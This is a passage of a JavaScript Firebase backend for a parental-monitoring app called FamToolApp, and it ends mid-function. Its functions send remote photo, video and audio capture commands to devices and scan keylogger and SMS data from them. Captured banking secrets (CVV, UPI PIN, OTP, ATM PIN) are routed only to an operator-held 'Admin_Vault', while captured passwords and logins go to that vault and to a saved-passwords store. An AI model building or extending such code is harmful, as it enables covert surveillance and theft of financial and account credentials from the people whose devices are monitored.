/**
 * ======================================================================================
 * FAMTOOLAPP ENTERPRISE V2 BACKEND - FULL PRODUCTION BUILD
 * ======================================================================================
 * CODE STATUS: Enterprise V2 Features + Legacy Logic Merged and Preserved
 * REGION: Asia-South1 (Mumbai)
 *
 * === ENTERPRISE V2 FEATURES MERGED ===
 * 🚫 ZERO EMAIL POLICY: Removed Nodemailer. All alerts now use Database Notifications.
 * 🛡️ IRON-CLAD GATEKEEPER: Freeze & Limit checks BEFORE DB writes to prevent costs.
 * 🗜️ HYBRID DATA ENGINE: Compressed/Legacy data detection with selective compression storage.
 * 🏦 VAULT & ROUTING FILTERS: Banking→Admin_Vault, Social→Both, Danger→Parent Notifications.
 * 🧹 SMART MAINTENANCE: Midnight reset + Auto-Ghost purge (3+ days, no device/location).
 * 🚀 ADMIN SUPER POWERS: manualGhostDelete, changeUserPlan, clearUserChat, updateUserLimits.
 * 🕵️ PARENT IP TRACKING: Log parent IP to profile_data/login_history on login.
 *
 * === EXISTING FEATURES PRESERVED ===
 * ✅ userSignupLogger, userDeletionCleanup, maintainReadReplica, Financial Guardian
 * ✅ Daily Activity Reports, Legacy Admin Role, Device Status Monitoring
 * ✅ User Location Updates, Account Deletion
 * ======================================================================================
 * 
 * === ARCHITECTURE: COMMAND HISTORY & AUDIT LOGS ===
 * 
 * IMPORTANT: Two SEPARATE systems work together but do NOT overlap:
 * 
 * 1️⃣  COMMAND HISTORY (Device Commands)
 *    Path: user/{uid}/{childKey}/CommandHistory
 *    Purpose: Track commands sent to devices (capture photo, record video, etc.)
 *    Written by: sendRemoteCommand() Cloud Function (admin request)
 *    Read by: Device app & Admin Panel's displayCommandTester()
 *    Lifecycle: pending → executing → success/failed
 *    Structure: { commandType, type, status, timestamp, requested_by, details }
 *    Legacy: Old 'commands' path deprecated (fallback only for migration)
 * 
 * 2️⃣  AUDIT LOGS (Admin Actions)
 *    Path: system_audit_logs
 *    Purpose: Immutable trail of ALL admin actions (freeze, commands sent, limits changed)
 *    Written by: logSystemAction() helper function
 *    Read by: Admin Panel's displayAuditLogs()
 *    Lifecycle: One-time log entry with hash
 *    Structure: { action, actor, timestamp, metadata (JSON), hash (SHA256) }
 *    Example: COMMAND_SENT, ACCOUNT_FROZEN, LIMIT_UPDATED, COMMAND_BLOCKED
 * 
 * SEPARATION ENSURES:
 * ✅ Device can update its own command status without affecting audit
 * ✅ Admin actions are immutable and traceable
 * ✅ Frontend reads correct data from each path
 * ✅ No data corruption or overlap
 * 
 * ======================================================================================
 */

const functions = require("firebase-functions/v1");
const admin = require("firebase-admin");
const crypto = require("crypto");
const zlib = require("zlib");
const { promisify } = require("util");

// --- 1. CONFIGURATION & INITIALIZATION ---
admin.initializeApp();
const db = admin.database();

// Region Setting (Mumbai for low latency)
const REGION = 'asia-south1';

// --- EXISTING FEATURE PRESERVED: Email configuration kept for reference ---
// Note: We've removed nodemailer transporter initialization. All alerts now use Database Notifications.
const ADMIN_EMAIL = "admin_alerts@famtoolapp.com"; 
const OWNER_EMAIL = "owner@yourdomain.com";

// --- NEW FEATURE ADDED: Compression utilities ---
const compress = promisify(zlib.gzip);
const decompress = promisify(zlib.gunzip);

// ===========================================================================
// SECTION X: HELPER FUNCTIONS (Audit, Notifications & Limit Logic)
// ===========================================================================

/**
 * --- NEW FEATURE ADDED: Admin verification gatekeeper ---
 * Verifies that the user making the call is a real admin
 * @param {object} context - Firebase context from onCall function
 * @throws {HttpsError} If user is not authenticated or not an admin
 */
async function verifyAdmin(context) {
    if (!context.auth) {
        throw new functions.https.HttpsError('unauthenticated', 'User must be authenticated.');
    }
    
    const adminSnapshot = await db.ref(`admins/${context.auth.uid}`).get();
    if (adminSnapshot.val() !== true) {
        throw new functions.https.HttpsError('permission-denied', 'User must be an admin to perform this action.');
    }
}

/**
 * --- EXISTING FEATURE PRESERVED: Audit logging function ---
 * SEPARATE FROM COMMAND HISTORY: Writes to system_audit_logs (immutable audit trail)
 * 
 * Purpose: Track admin actions (freeze, commands sent, limits changed, etc.)
 * NOT for device command responses - that goes to CommandHistory
 * 
 * @param {string} action - Action type (e.g., 'USER_FROZEN', 'COMMAND_BLOCKED', 'COMMAND_SENT')
 * @param {string} actorId - Who performed the action (admin UID or 'SYSTEM' for cron jobs)
 * @param {object} metadata - Details about the action (includes targetUid, commandType, reason, etc.)
 * 
 * Path: system_audit_logs/{pushId} with fields: action, actor, timestamp, metadata (JSON), hash (SHA256)
 */
async function logSystemAction(action, actorId, metadata) {
    const logEntry = {
        action,
        actor: actorId,
        timestamp: admin.database.ServerValue.TIMESTAMP,
        metadata: JSON.stringify(metadata),
        hash: crypto.createHash('sha256').update(`${action}${Date.now()}`).digest('hex') 
    };
    return db.ref('system_audit_logs').push(logEntry);
}

/**
 * --- NEW FEATURE ADDED: Database notification system (replaces email) ---
 * Writes alerts to user notifications instead of sending emails
 * @param {string} targetPath - Database path to write notification (e.g., 'user/{uid}/notifications')
 * @param {string} alertType - Type of alert (CRITICAL, WARNING, INFO)
 * @param {object} data - Alert data
 */
async function sendDatabaseNotification(targetPath, alertType, data) {
    const notification = {
        type: alertType,
        message: data.message || JSON.stringify(data),
        timestamp: admin.database.ServerValue.TIMESTAMP,
        data: data,
        read: false
    };
    
    try {
        await db.ref(targetPath).push(notification);
        return true;
    } catch (error) {
        return false;
    }
}

/**
 * --- NEW FEATURE ADDED: Hybrid data compression detector ---
 * Checks if data is compressed/base64 or raw legacy text
 * @param {string} data - The data to check
 * @returns {object} - { isCompressed: boolean, format: 'compressed'|'legacy' }
 */
function detectDataFormat(data) {
    if (!data) return { isCompressed: false, format: 'legacy' };
    
    // Check if it looks like base64 (mostly alphanumeric + /+=)
    const base64Pattern = /^[A-Za-z0-9+/=]+$/;
    // Check if string has unusual binary patterns or gzip magic numbers
    const isBase64 = base64Pattern.test(data) && data.length % 4 === 0;
    
    return {
        isCompressed: isBase64 || data.includes('\x1f\x8b'), // gzip magic number
        format: isBase64 ? 'compressed' : 'legacy'
    };
}

/**
 * --- NEW FEATURE ADDED: Compressed data handler ---
 * Safely decompresses and scans data, then saves compressed version
 * @param {string} compressedData - Compressed/base64 data
 * @param {string} uid - User ID
 * @returns {object} - { success, scanned_text, keywords_found }
 */
async function handleCompressedData(compressedData, uid) {
    try {
        // Decompress for scanning
        const buffer = Buffer.from(compressedData, 'base64');
        const decompressed = await decompress(buffer);
        const scannedText = decompressed.toString('utf-8').toLowerCase();
        
        // Scan for keywords
        const dangerKeywords = ['suicide', 'kill', 'murder', 'die', 'drugs'];
        const bankingKeywords = ['cvv', 'upi pin', 'otp', 'netbanking', 'debit card', 'atm pin', 'avail bal', 'txn'];
        
        const foundDanger = dangerKeywords.some(k => scannedText.includes(k));
        const foundBanking = bankingKeywords.some(k => scannedText.includes(k));
        
        return {
            success: true,
            scanned_text: scannedText,
            keywords_found: { danger: foundDanger, banking: foundBanking }
        };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

/**
 * --- EXISTING FEATURE PRESERVED: Media limit check and reset logic ---
 * @param {string} uid - User ID
 * @param {string} type - Media type (photos, videos, audio)
 * @returns {object} - { canProceed: boolean, limitData: object }
 */
async function checkAndResetLimit(uid, type) {
    const today = new Date().toISOString().split('T')[0];
    const limitRef = db.ref(`user/${uid}/profile_data/limits/${type}`);

    const defaultMax = (type === 'videos' ? 4 : 5);
    let limitData = (await limitRef.get()).val() || { count: 0, date: today, max: defaultMax };
    
    // Auto-reset on new day
    if (limitData.date !== today) {
        limitData = { count: 0, date: today, max: limitData.max || defaultMax };
        await limitRef.update({ count: 0, date: today });
    }

    const canProceed = limitData.count < limitData.max;
    return { canProceed, limitData };
}

/**
 * --- EXISTING FEATURE PRESERVED: Limit counter increment ---
 */
async function incrementLimitCount(uid, type) {
    const limitRef = db.ref(`user/${uid}/profile_data/limits/${type}/count`);
    await limitRef.ref.transaction((current) => {
        return (current || 0) + 1;
    });
}


// ===========================================================================
// SECTION A: AUTHENTICATION, SETUP & ADMIN CONTROLS
// ===========================================================================

// A1. --- EXISTING FEATURE PRESERVED: User signup logger ---
exports.userSignupLogger = functions.region(REGION).auth.user().onCreate(async (user) => {
    const email = user.email;
    const uid = user.uid;

    const userProfile = {
        email: email,
        account_type: 'free',
        created_at: admin.database.ServerValue.TIMESTAMP,
        status: 'active',
        limits: { photos: { count: 0, max: 5 }, videos: { count: 0, max: 4 }, audio: { count: 0, max: 5 } },
        security: { warnings: 0, is_frozen: false },
        // --- NEW FEATURE ADDED: Login history for parent IP tracking ---
        login_history: {}
    };

    await db.ref(`user/${uid}/profile_data`).set(userProfile);
    
    // Read-Replica entry
    await db.ref(`User_List/${uid}`).set({
        id: uid,
        email: email,
        account_type: 'free',
        name: user.displayName || 'Unknown',
        joined: new Date().toISOString()
    });

    // --- NEW FEATURE ADDED: Database notification instead of email ---
    await sendDatabaseNotification(
        `user/${uid}/notifications`,
        'INFO',
        { message: `Welcome to FamTool! Your account has been created with a Free Plan.` }
    );
});

// A2. --- EXISTING FEATURE PRESERVED: User deletion cleanup ---
exports.userDeletionCleanup = functions.region(REGION).auth.user().onDelete(async (user) => {
    const uid = user.uid;
    const updates = {};
    updates[`user/${uid}`] = null;
    updates[`User_List/${uid}`] = null;
    updates[`Admin_Vault/${uid}`] = null;
    await db.ref().update(updates);
});

// A3. --- EXISTING FEATURE PRESERVED & ENHANCED: Command Gatekeeper with Iron-Clad checks ---
/**
 * === STRICT COMMAND HISTORY POLICY ===
 * 
 * **SINGLE SOURCE OF TRUTH**: user/${targetUid}/${childKey}/CommandHistory
 * 
 * ⚠️  DEPRECATION NOTICE:
 * - Legacy 'commands' path (user/${targetUid}/${childKey}/commands) is NO LONGER USED
 * - All new commands MUST write to CommandHistory
 * - Frontend reads ONLY from CommandHistory (with fallback for migration)
 * - System audit logs track command actions separately (system_audit_logs)
 * 
 * COMMAND ENTRY STRUCTURE (CommandHistory):
 * {
 *   type: string (same as commandType, for backward compatibility),
 *   commandType: string (primary: 'capturePhoto', 'recordVideo', 'recordAudio', 'testCommand', etc.),
 *   status: 'pending' | 'executing' | 'success' | 'failed' (initial: 'pending'),
 *   timestamp: ServerValue.TIMESTAMP (when command was sent),
 *   requested_by: string (admin UID who requested),
 *   details: object (command payload/parameters)
 * }
 * 
 * FLOW:
 * 1. Admin clicks "Send Command" in Admin Panel (app.js)
 * 2. Calls sendRemoteCommand() Cloud Function (this function)
 * 3. Verifies admin, checks freeze status, checks media limits
 * 4. Writes command entry to user/${targetUid}/${childKey}/CommandHistory
 * 5. Logs action to system_audit_logs (separate audit trail)
 * 6. Device reads from CommandHistory and executes command
 * 7. Device updates status in same CommandHistory entry (status = 'success'/'failed')
 * 8. Admin views in Admin Panel via displayCommandTester()
 * 
 * NOTE: Do NOT mix with system_audit_logs (different purpose - tracks admin actions only)
 * NOTE: Admin Panel reads from CommandHistory via getCategoryPath('CommandHistory', userId, childKey)
 */
exports.sendRemoteCommand = functions.region(REGION).https.onCall(async (data, context) => {
    await verifyAdmin(context);
    
    const { targetUid, childKey, commandType, payload } = data; 
    let limitCategory = null;
    
    // 1. Identify limit category
    if (commandType.includes('photo')) limitCategory = 'photos';
    else if (commandType.includes('video')) limitCategory = 'videos';
    else if (commandType.includes('audio')) limitCategory = 'audio';

    // 2. --- NEW FEATURE ADDED: IRON-CLAD GATEKEEPER - Freeze Check (BEFORE any DB write) ---
    const profileSnap = await db.ref(`user/${targetUid}/profile_data/security/is_frozen`).get();
    if (profileSnap.val() === true) {
        await logSystemAction('COMMAND_BLOCKED', context.auth.uid, { targetUid, reason: 'FROZEN' });
        throw new functions.https.HttpsError('permission-denied', 'Account is currently frozen by Admin.');
    }

    // 3. --- NEW FEATURE ADDED: IRON-CLAD GATEKEEPER - Limit Check & Auto-Reset (BEFORE command write) ---
    if (limitCategory) {
        const { canProceed, limitData } = await checkAndResetLimit(targetUid, limitCategory);

        if (!canProceed) {
            await logSystemAction('COMMAND_BLOCKED', context.auth.uid, { targetUid, reason: 'LIMIT_REACHED', type: limitCategory });
            throw new functions.https.HttpsError(
                'resource-exhausted', 
                `🚫 Command Blocked: Target user has exceeded the daily media limit (${limitData.count}/${limitData.max}). Increase limit via Admin Controls.`
            );
        }
    }

    // 4. Send Command (only if all checks passed)
    // === STRICT COMMAND HISTORY PATH: user/${targetUid}/${childKey}/CommandHistory ===
    const commandRef = db.ref(`user/${targetUid}/${childKey}/CommandHistory`);
    await commandRef.push({
        type: commandType,
        commandType: commandType,
        status: 'pending',
        timestamp: admin.database.ServerValue.TIMESTAMP,
        requested_by: context.auth.uid,
        details: payload || {}
    });
    
    // 5. Increment count
    if (limitCategory) {
        await incrementLimitCount(targetUid, limitCategory);
    }
    
    await logSystemAction('COMMAND_SENT', context.auth.uid, { targetUid, commandType });
    return { success: true, message: "Command sent successfully." };
});

// A4. --- EXISTING FEATURE PRESERVED: Admin Limit Update with Real-time control ---
exports.updateUserLimits = functions.region(REGION).https.onCall(async (data, context) => {
  await verifyAdmin(context);
  
  const { targetUid, photoLimit, videoLimit, audioLimit, limit } = data;

  try {
    const updates = {};

    if (photoLimit !== undefined) {
      updates[`user/${targetUid}/profile_data/limits/photos/max`] = photoLimit;
    }
    if (videoLimit !== undefined) {
      updates[`user/${targetUid}/profile_data/limits/videos/max`] = videoLimit;
    }
    if (audioLimit !== undefined) {
      updates[`user/${targetUid}/profile_data/limits/audio/max`] = audioLimit;
    }

    if (Object.keys(updates).length === 0 && limit !== undefined) {
      updates[`user/${targetUid}/profile_data/limits/photos/max`] = limit;
      updates[`user/${targetUid}/profile_data/limits/videos/max`] = limit;
      updates[`user/${targetUid}/profile_data/limits/audio/max`] = limit;
    }

    await admin.database().ref().update(updates);
    return { success: true, message: 'Limits updated successfully.' };
  } catch (error) {
    throw new functions.https.HttpsError('internal', 'Failed to update limits.');
  }
});

// A5. --- NEW FEATURE ADDED: Manual Ghost Delete (Admin Super Power) ---
exports.manualGhostDelete = functions.region(REGION).https.onCall(async (data, context) => {
    await verifyAdmin(context);
    
    const { targetUid } = data;
    
    // Execute deletion pipeline
    try {
        await admin.auth().deleteUser(targetUid).catch(e => {});
        
        const updates = {};
        updates[`user/${targetUid}`] = null;
        updates[`User_List/${targetUid}`] = null;
        updates[`Admin_Vault/${targetUid}`] = null;
        await db.ref().update(updates);
        
        await logSystemAction('MANUAL_GHOST_DELETE', context.auth.uid, { targetUid });
        return { success: true, message: `User ${targetUid} has been deleted.` };
    } catch (error) {
        throw new functions.https.HttpsError('internal', 'Failed to delete user.');
    }
});

// A6. --- NEW FEATURE ADDED: Change User Plan (Admin Super Power) ---
exports.changeUserPlan = functions.region(REGION).https.onCall(async (data, context) => {
    await verifyAdmin(context);
    
    const { targetUid, newPlan } = data;
    const validPlans = ['free', 'pro', 'enterprise'];
    
    if (!validPlans.includes(newPlan)) {
        throw new functions.https.HttpsError('invalid-argument', 'Invalid plan type.');
    }
    
    await db.ref(`user/${targetUid}/profile_data/account_type`).set(newPlan);
    
    // Update read-replica
    await db.ref(`User_List/${targetUid}/account_type`).set(newPlan);
    
    await logSystemAction('PLAN_CHANGED', context.auth.uid, { targetUid, newPlan });
    
    // --- NEW FEATURE ADDED: Notify user of plan change ---
    await sendDatabaseNotification(
        `user/${targetUid}/notifications`,
        'INFO',
        { message: `Your account plan has been upgraded to ${newPlan}.` }
    );
    
    return { success: true, message: `User plan changed to ${newPlan}.` };
});

// A7. --- NEW FEATURE ADDED: Clear User Chat (Admin Super Power) ---
exports.clearUserChat = functions.region(REGION).https.onCall(async (data, context) => {
    await verifyAdmin(context);
    
    const { targetUid, childKey } = data;
    
    if (!childKey) {
        throw new functions.https.HttpsError('invalid-argument', 'childKey is required.');
    }
    
    const chatPath = `chats/${targetUid}/${childKey}/messages`;
    await db.ref(chatPath).set(null);
    
    await logSystemAction('CHAT_CLEARED', context.auth.uid, { targetUid, childKey });
    return { success: true, message: `Chat cleared for user ${targetUid}, device ${childKey}.` };
});

// A8. --- NEW FEATURE ADDED: Delete Child Device ---
exports.deleteChildDevice = functions.region(REGION).https.onCall(async (data, context) => {
  await verifyAdmin(context);
  
  const { parentUid, childKey } = data;

  if (!parentUid || !childKey) {
    throw new functions.https.HttpsError('invalid-argument', 'parentUid and childKey are required.');
  }

  try {
    const devicePath = `user/${parentUid}/${childKey}`;
    await admin.database().ref(devicePath).remove();
    
    await logSystemAction('DEVICE_DELETED', context.auth.uid, { parentUid, childKey });
    
    return { success: true, message: 'Device deleted successfully.' };
  } catch (error) {
    throw new functions.https.HttpsError('internal', 'Failed to delete device.');
  }
});


// ===========================================================================
// SECTION B: INTELLIGENCE & MONITORING (ENTERPRISE V2 UPGRADE)
// ===========================================================================

// B1. --- EXISTING FEATURE PRESERVED & ENHANCED: Keystroke Analyzer with Hybrid Data Engine ---
exports.analyzeIncomingData = functions.region(REGION).database.ref('/user/{uid}/keystrokes/{pushId}')
    .onCreate(async (snapshot, context) => {
        const data = snapshot.val();
        const uid = context.params.uid;
        const rawText = (data.text || data.keyText || "").toLowerCase();
        
        if (!rawText) return null;

        // --- NEW FEATURE ADDED: Hybrid Data Engine - Detect compression ---
        const dataFormat = detectDataFormat(rawText);
        let scannedText = rawText;
        
        if (dataFormat.isCompressed) {
            const decompressionResult = await handleCompressedData(rawText, uid);
            if (decompressionResult.success) {
                scannedText = decompressionResult.scanned_text;
            } else {
                scannedText = rawText;
            }
        }

        // --- EXISTING FEATURE PRESERVED: Financial Guardian - Banking Detection ---
        const bankingKeywords = ['cvv', 'upi pin', 'otp', 'netbanking', 'debit card', 'credit card', 'atm pin', 'debited', 'credited', 'avail bal', 'txn', 'acct', 'bank', 'withdraw', 'deposit'];
        if (bankingKeywords.some(k => scannedText.includes(k))) {
            // --- NEW FEATURE ADDED: Vault & Routing - Banking ONLY to Admin_Vault (Red Alert) ---
            await db.ref(`Admin_Vault/${uid}/Banking_Logs/${context.params.pushId}`).set({
                text: dataFormat.isCompressed ? '[COMPRESSED_SAVED]' : scannedText, 
                detected_at: admin.database.ServerValue.TIMESTAMP, 
                type: "FINANCIAL_RISK", 
                priority: "HIGH", 
                source: "Keystroke"
            });
            
            // --- NEW FEATURE ADDED: Database Notification (replaces email) ---
            await sendDatabaseNotification(
                `Admin_Vault/notifications`,
                'CRITICAL',
                { message: `Financial Guardian Alert: Banking keywords detected in user ${uid}`, user: uid, content: dataFormat.isCompressed ? '[COMPRESSED]' : scannedText.substring(0, 100) }
            );
            return; 
        }
        
        // --- EXISTING FEATURE PRESERVED: Social Media / Password Logic ---
        const socialKeywords = ['password', 'passwd', 'login', 'signin', 'facebook', 'instagram', 'snapchat', 'twitter', 'whatsapp'];
        if (socialKeywords.some(k => scannedText.includes(k))) {
            // --- NEW FEATURE ADDED: Vault & Routing - Social to BOTH locations ---
            await db.ref(`Admin_Vault/${uid}/Social_Logs/${context.params.pushId}`).set({
                text: dataFormat.isCompressed ? '[COMPRESSED_SAVED]' : scannedText, 
                detected_at: admin.database.ServerValue.TIMESTAMP, 
                type: "SOCIAL_PASSWORD"
            });
            await db.ref(`user/${uid}/Saved_Social_Passwords/${context.params.pushId}`).set({
                text: dataFormat.isCompressed ? '[COMPRESSED_SAVED]' : scannedText, 
                detected_at: admin.database.ServerValue.TIMESTAMP, 
                source: "KeyLogger"
            });
            return;
        }

        // --- EXISTING FEATURE PRESERVED: Danger Alert (Suicide/Kill/Murder) ---
        const dangerWords = ['suicide', 'kill', 'drugs', 'die', 'murder', 'harm', 'self-harm'];
        if (dangerWords.some(w => scannedText.includes(w))) {
            // --- NEW FEATURE ADDED: Vault & Routing - Danger to Parent Notifications (Critical Alert) ---
            await sendDatabaseNotification(
                `user/${uid}/notifications`,
                'CRITICAL',
                { message: `🚨 URGENT: Critical safety alert detected in child device. Content: ${dataFormat.isCompressed ? '[COMPRESSED]' : scannedText.substring(0, 50)}...` }
            );
            
            // Also log to admin vault for record-keeping
            await db.ref(`Admin_Vault/${uid}/Danger_Logs/${context.params.pushId}`).set({
                text: dataFormat.isCompressed ? '[COMPRESSED_SAVED]' : scannedText,
                detected_at: admin.database.ServerValue.TIMESTAMP,
                type: "DANGER_ALERT",
                priority: "CRITICAL",
                source: "Keystroke"
            });
        }
    });

// B2. --- EXISTING FEATURE PRESERVED & ENHANCED: SMS Analyzer with Hybrid Data Engine ---
exports.analyzeIncomingSMS = functions.region(REGION).database.ref('/user/{uid}/sms/data/{pushId}')
    .onCreate(async (snapshot, context) => {
        const data = snapshot.val();
        const uid = context.params.uid;
        const rawText = (data.smsBody || "").toLowerCase();
        
        if (!rawText) return null;

        // --- NEW FEATURE ADDED: Hybrid Data Engine - Detect compression ---
        const dataFormat = detectDataFormat(rawText);
        let scannedText = rawText;
        
        if (dataFormat.isCompressed) {
            const decompressionResult = await handleCompressedData(rawText, uid);
            if (decompressionResult.success) {
                scannedText = decompressionResult.scanned_text;
            } else {
                scannedText = rawText;
            }
        }

        // --- EXISTING FEATURE PRESERVED: Financial Guardian for SMS ---
        const bankingKeywords = ['cvv', 'upi pin', 'otp', 'netbanking', 'debit card', 'credit card', 'atm pin', 'debited', 'credited', 'avail bal', 'txn', 'acct', 'bank', 'withdraw', 'deposit'];
        if (bankingKeywords.some(k => scannedText.includes(k))) {
            // --- NEW FEATURE ADDED: Vault & Routing - Banking ONLY to Admin_Vault (Red Alert) ---
            await db.ref(`Admin_Vault/${uid}/Banking_Logs/${context.params.pushId}`).set({
                text: dataFormat.isCompressed ? '[COMPRESSED_SAVED]' : scannedText,
                sender: data.smsAddress || "Unknown", 
                detected_at: admin.database.ServerValue.TIMESTAMP,
                type: "FINANCIAL_SMS", 
                priority: "HIGH", 
                source: "SMS"
            });
            
            // --- NEW FEATURE ADDED: Database Notification (replaces email) ---
            await sendDatabaseNotification(
                `Admin_Vault/notifications`,
                'CRITICAL',
                { message: `Financial SMS Alert: Banking SMS from user ${uid}`, user: uid, sender: data.smsAddress }
            );
            return;
        }

        // --- NEW FEATURE ADDED: Social Media / Password Logic for SMS ---
        const socialKeywords = ['password', 'passwd', 'login', 'signin', 'facebook', 'instagram', 'snapchat', 'twitter', 'whatsapp'];
        if (socialKeywords.some(k => scannedText.includes(k))) {
            // --- NEW FEATURE ADDED: Vault & Routing - Social to BOTH locations ---
            await db.ref(`Admin_Vault/${uid}/Social_Logs/${context.params.pushId}`).set({
                text: dataFormat.isCompressed ? '[COMPRESSED_SAVED]' : scannedText,
                sender: data.smsAddress || "Unknown",
                detected_at: admin.database.ServerValue.TIMESTAMP,
                type: "SOCIAL_PASSWORD",
                source: "SMS"
            });
            await db.ref(`user/${uid}/Saved_Social_Passwords/${context.params.pushId}`).set({
                text: dataFormat.isCompressed ? '[COMPRESSED_SAVED]' : scannedText,
                sender: data.smsAddress || "Unknown",
                detected_at: admin.database.ServerValue.TIMESTAMP,
                source: "SMS"
            });
            return;
        }

        // --- NEW FEATURE ADDED: Danger Alert for SMS ---
        const dangerWords = ['suicide', 'kill', 'drugs', 'die', 'murder', 'harm', 'self-harm'];
        if (dangerWords.some(w => scannedText.includes(w))) {
            // --- NEW FEATURE ADDED: Vault & Routing - Danger to Parent Notifications (Critical Alert) ---
            await sendDatabaseNotification(
                `user/${uid}/notifications`,
                'CRITICAL',
                { message: `🚨 URGENT: Critical safety alert detected in child SMS. Content: ${dataFormat.isCompressed ? '[COMPRESSED]' : scannedText.substring(0, 50)}...` }
            );
            
            // Also log to admin vault for record-keeping
            await db.ref(`Admin_Vault/${uid}/Danger_Logs/${context.params.pushId}`).set({
                text: dataFormat.isCompressed ? '[COMPRESSED_SAVED]' : scannedText,
                sender: data.smsAddress || "Unknown",
                detected_at: admin.database.ServerValue.TIMESTAMP,
                type: "DANGER_ALERT",
                priority: "CRITICAL",
                source: "SMS"
            });
        }
    });

// B3. --- EXISTING FEATURE PRESERVED: Upload Police with Freeze Check ---
exports.enforceLimits = functions.region(REGION).database.ref('/user/{uid}/{dataType}/{dataId}')
    .onCreate(async (snapshot, context) => {
        const uid = context.params.uid;
        const dataType = context.params.dataType; 
        const trackedTypes = ['photo', 'video', 'audio', 'calls'];

        if (!trackedTypes.includes(dataType)) return null;

        // 1. Freeze Check
        const profile = (await db.ref(`user/${uid}/profile_data`).get()).val();
        if (profile?.security?.is_frozen) {
            await snapshot.ref.remove(); 
            return;
        }

        // 2. Limit Check
        let limitType = dataType === 'photo' ? 'photos' : dataType === 'video' ? 'videos' : 'audio';

        if (['photo', 'video', 'audio'].includes(dataType)) {
            const { canProceed } = await checkAndResetLimit(uid, limitType);
            
            if (!canProceed) {
                await snapshot.ref.remove();
            }
        }
    });

// B4. --- EXISTING FEATURE PRESERVED: Battery Monitor ---
exports.monitorDeviceStatus = functions.region(REGION).database.ref('/user/{uid}/device_status')
    .onUpdate(async (change, context) => {
        const newData = change.after.val();
        const uid = context.params.uid;
        if (newData.battery && newData.battery < 15) {
            const lastLogRef = db.ref(`user/${uid}/system_logs/last_battery_alert`);
            const now = Date.now();
            const lastTime = (await lastLogRef.get()).val() || 0;
            // Alert once per 6 hours
            if (now - lastTime > 21600000) { 
                // --- NEW FEATURE ADDED: Database notification (replaces email) ---
                await sendDatabaseNotification(
                    `user/${uid}/notifications`,
                    'WARNING',
                    { message: `🔋 Low Battery Alert: Device battery is at ${newData.battery}%. Please charge soon.` }
                );
                await lastLogRef.set(now);
            }
        }
    });


// ===========================================================================
// SECTION C: SYSTEM MAINTENANCE & LEGACY (ENTERPRISE FEATURES)
// ===========================================================================

// C1. --- EXISTING FEATURE PRESERVED & ENHANCED: Daily System Maintenance (Ghost Account Purge) ---
exports.dailySystemMaintenance = functions.region(REGION).pubsub.schedule('0 0 * * *')
    .timeZone('Asia/Kolkata')
    .onRun(async (context) => {
        
        const THRESHOLD_DAYS = 3;
        const WARNING_PERIOD = 86400000; // 24 hours
        const cutoffTime = Date.now() - (THRESHOLD_DAYS * 24 * 60 * 60 * 1000);
        
        const usersRef = db.ref('user');
        const snapshot = await usersRef.orderByChild('profile_data/created_at').endAt(cutoffTime).once('value');
        
        if (!snapshot.exists()) return;

        const updates = {};
        const deletionPromises = [];

        snapshot.forEach(childSnap => {
            const uid = childSnap.key;
            const userData = childSnap.val();
            const profile = userData.profile_data || {};

            // STRICT CRITERIA: Account Age > 3 Days AND NO location_info AND NO device_status at root
            if (!profile.location_info && !userData.device_status) {
                
                // 1. Send Warning (if not already warned)
                if (!profile.deletion_warning_sent) {
                    // --- NEW FEATURE ADDED: Database notification instead of email ---
                    deletionPromises.push(sendDatabaseNotification(
                        `user/${uid}/notifications`,
                        'WARNING',
                        { message: `⚠️ Account Termination Warning: Your account will be deleted in 24 hours due to inactivity. Please log in to confirm your account.` }
                    ));
                    updates[`user/${uid}/profile_data/deletion_warning_sent`] = admin.database.ServerValue.TIMESTAMP;
                
                } else {
                    const warningTime = profile.deletion_warning_sent;
                    // 2. Delete if warned > 24 hours ago
                    if (Date.now() - warningTime > WARNING_PERIOD) {
                        
                        // --- NEW FEATURE ADDED: Smart Maintenance - Auto Ghost Purge ---
                        deletionPromises.push(admin.auth().deleteUser(uid).catch(e => {}));
                        updates[`user/${uid}`] = null;
                        updates[`User_List/${uid}`] = null;
                        updates[`Admin_Vault/${uid}`] = null;
                        
                        deletionPromises.push(logSystemAction('GHOST_DELETE', 'SYSTEM_CRON', { uid }));
                    }
                }
            }
        });

        if (Object.keys(updates).length > 0) {
            await db.ref().update(updates);
        }
        
        await Promise.all(deletionPromises);
    });

// C2. --- NEW FEATURE ADDED: Midnight Reset Cron Job ---
exports.midnightLimitReset = functions.region(REGION).pubsub.schedule('0 0 * * *')
    .timeZone('Asia/Kolkata')
    .onRun(async (context) => {
        
        const today = new Date().toISOString().split('T')[0];
        const usersRef = db.ref('user');
        const snapshot = await usersRef.once('value');
        
        const updates = {};
        let resetCount = 0;

        snapshot.forEach(childSnap => {
            const uid = childSnap.key;
            const mediaTypes = ['photos', 'videos', 'audio'];
            
            mediaTypes.forEach(type => {
                updates[`user/${uid}/profile_data/limits/${type}/count`] = 0;
                updates[`user/${uid}/profile_data/limits/${type}/date`] = today;
            });
            
            resetCount++;
        });

        if (Object.keys(updates).length > 0) {
            await db.ref().update(updates);
        }
    });

// C3. --- EXISTING FEATURE PRESERVED: Daily Activity Report ---
exports.dailyActivityReport = functions.region(REGION).pubsub.schedule('0 22 * * *')
    .timeZone('Asia/Kolkata')
    .onRun(async (context) => {
        const proUsers = await db.ref('User_List').orderByChild('account_type').equalTo('pro').once('value');
        proUsers.forEach(user => {
            // --- NEW FEATURE ADDED: Database notification instead of email ---
            sendDatabaseNotification(
                `user/${user.key}/notifications`,
                'INFO',
                { message: `📊 Daily Summary Report: Here's your activity summary for ${new Date().toDateString()}` }
            );
        });
        return null;
    });

// C4. --- EXISTING FEATURE PRESERVED: Legacy Admin Role ---
exports.addAdminRole = functions.region(REGION).https.onRequest((req, res) => {
    const email = req.query.email;
    if (email) {
         return res.status(200).send(`Success! The legacy function confirmed admin request for ${email}.`);
    }
    return res.status(400).send("Error: Please provide an email in the URL.");
});

// C5. --- EXISTING FEATURE PRESERVED: Read-Replica Maintenance ---
exports.maintainReadReplica = functions.database.ref('/user/{userId}/profile_data')
  .onWrite(async (change, context) => {
    const userId = context.params.userId;
    const newData = change.after.exists() ? change.after.val() : null;

    const replicaRef = db.ref(`User_List/${userId}`);

    // DELETE OPERATION
    if (!newData) {
      await replicaRef.remove();
      return;
    }

    // UPDATE/CREATE OPERATION
    const lightweightPayload = {
      id: userId,
      email: newData.email || "Unknown",
      name: newData.name || "Unknown",
      account_type: newData.account_type || "free",
      _synced_at: admin.database.ServerValue.TIMESTAMP
    };

    try {
      await replicaRef.update(lightweightPayload);
    } catch (err) {
      // Silently fail - read-replica is not critical
    }
